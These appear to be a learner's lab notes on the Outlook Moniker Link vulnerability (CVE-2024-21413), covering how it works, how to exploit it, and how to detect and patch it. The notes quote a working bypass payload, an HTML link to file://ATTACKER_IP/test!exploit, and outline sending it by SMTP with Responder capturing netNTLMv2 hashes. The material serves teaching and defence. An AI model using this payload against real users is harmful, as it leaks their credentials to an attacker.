# Moniker Link (CVE-2024-21413)

## Introduction
- The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link. An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.


## Moniker Link

### Concepts learned
- Outlook renders HTML and can open file:// moniker links.
- Outlook’s Protected View normally blocks automatic external-app / network triggers from email.
- Adding ! + text to a file:// moniker (e.g. file://ATTACKER/test!exploit) can bypass Protected View.
- Bypass causes an SMB auth attempt that leaks the victim’s netNTLMv2 hash.
- The remote share does not need to exist for the auth attempt to occur.
- Moniker handling uses Windows COM — credential theft is confirmed; RCE is theoretical (no PoC shown in the room).

### Explanation
- Outlook parses HTML anchors and treats file:// URIs as moniker links that can invoke OS handlers.
- Protected View intercepts and blocks external actions from email (read-only sandbox).
- The ! suffix in a file:// moniker changes how Outlook processes the link, causing Protected View to be bypassed.
- Once bypassed, Outlook attempts to access the specified SMB resource and performs NTLM/NTLMv2 authentication.
- The resulting netNTLMv2 response is sent to the attacker-controlled endpoint and can be captured.
- Captured hashes can be used for NTLM relay or offline analysis; COM involvement creates a theoretical path to code execution (not demonstrated).

### Notes
**Examples:**
- Blocked: <a href="file://ATTACKER_MACHINE/test">Click me</a>
- Bypass: <a href="file://ATTACKER_MACHINE/test!exploit">Click me</a>
**Key facts:**
- Share need not exist — authentication attempt alone leaks the hash.
- Domain-joined users may expose domain credentials.
**Detection signals:**
- Outlook (Outlook.exe) making SMB connections to external/unfamiliar IPs (TCP 445/139).
- Email bodies containing file:// URIs with ! suffix.
**Essential mitigations:**
- Apply vendor patches for CVE-2024-21413.
- Block outbound SMB (TCP 445/139) from client networks.


## Exploitaion

### Concepts learned
- Attack goal: email a Moniker Link that bypasses Outlook Protected View so the victim’s client attempts SMB auth to the attacker, leaking netNTLMv2.
- PoC approach: send an HTML email with a file://...!exploit link and have an SMB listener capture the authentication handshake.
- Practical steps: modify the moniker to your AttackBox IP, send via SMTP, have an SMB responder/listener running, victim clicks link → hash captured.

### Explanation
- The PoC constructs an HTML email containing a moniker link: <a href="file://ATTACKER_IP/test!exploit">Click me</a>.
- The script uses SMTP to deliver that HTML email to the victim mailbox.
- When Outlook processes the link (due to the ! suffix bypass), it attempts to access the SMB resource on the attacker IP, initiating NTLM/NTLMv2 auth.
- An attacker-controlled SMB listener (e.g., Responder or Impacket) accepts the connection and logs the netNTLMv2 response.
- Captured netNTLMv2 can be relayed or analyzed offline according to attacker capability.

### Notes
- PoC essentials: Python script builds MIME HTML email, fills From/To/Subject, connects to an SMTP server, authenticates, and sends the message.
**Required edits before running PoC:**
 - Replace ATTACKER_MACHINE in the moniker with your AttackBox IP.
 - Replace MAILSERVER with the room's SMTP server (or your SMTP).
 - Provide attacker account password when prompted (room uses attacker).
**Minimal attacker setup:**
 - Start an SMB listener (Responder or equivalent) on your attack interface.
 - Run the PoC script (e.g., python3 exploit.py).
 - Minimal verification: after victim clicks the link, the SMB listener will show the captured netNTLMv2.
 - Ethical note: use this only in lab environments / with permission.
 - Disable automatic external content rendering in mail clients.


## Detection

### Concepts learned
- Detect via email content (YARA) and network captures (PCAP/Wireshark).
- Florian Roth’s YARA flags file:// moniker patterns used by the exploit.
- Outbound SMB from Outlook shows NTLM/netNTLMv2 handshake in PCAP.

### Explanation
- YARA scans email headers/bodies for file://...! moniker patterns and common file extensions.
- If clicked, Outlook may initiate SMB auth to an external host — visible as SMB/NTLM traffic in PCAP.
- Correlating the email receipt and an outbound SMB connection is a strong indicator.

### Notes
- Actions: run YARA on mailstore; monitor outbound SMB (TCP 445/139); capture PCAPs for NTLM handshakes.
- Response: isolate host, collect email + PCAP + Windows auth logs.
- Tools: YARA, Wireshark/tcpdump, EDR/host logs.


## Remediation

### Concepts learned
- Patching Office/Outlook fixes CVE-2024-21413.
- Outlook configuration alone cannot prevent this exploit.
- Temporary controls include network blocks and user awareness.

### Explanation
- Apply Microsoft updates from February 2024 to remove the vulnerability.
- Blocking outbound SMB to untrusted IPs reduces risk but may affect legitimate file-sharing.
- Educating users to avoid unsolicited links and report suspicious emails helps mitigate attacks while patches are applied.

### Notes
- Patch: Windows Update or Microsoft Update Catalog (Feb 2024 Office/Outlook release).
- Network: Block SMB (TCP 445/139) to external hosts if possible.
- User awareness: Don’t click unknown links, preview URLs, report suspicious emails.
- Outlook settings: Protected View cannot fully stop this exploit.


## Key Takeaways
- Outlook can render HTML emails and process file:// moniker links, which can be exploited.
- Protected View mitigates some risks but can be bypassed using crafted moniker links (! suffix).
- Clicking a malicious moniker link can leak netNTLMv2 hashes via SMB to an attacker-controlled host.
- Exploitation can be automated via email phishing and SMTP delivery scripts.
- Detection can be performed using YARA rules on email content and monitoring SMB/NTLM traffic.
- Patch Office/Outlook promptly to fix CVE-2024-21413; configuration-only changes cannot fully prevent this attack.
- Temporary mitigations include network controls (blocking outbound SMB) and user awareness (avoid unsolicited links, report suspicious emails).
- Always test and practice attacks in controlled lab environments; never on production or unauthorized systems.
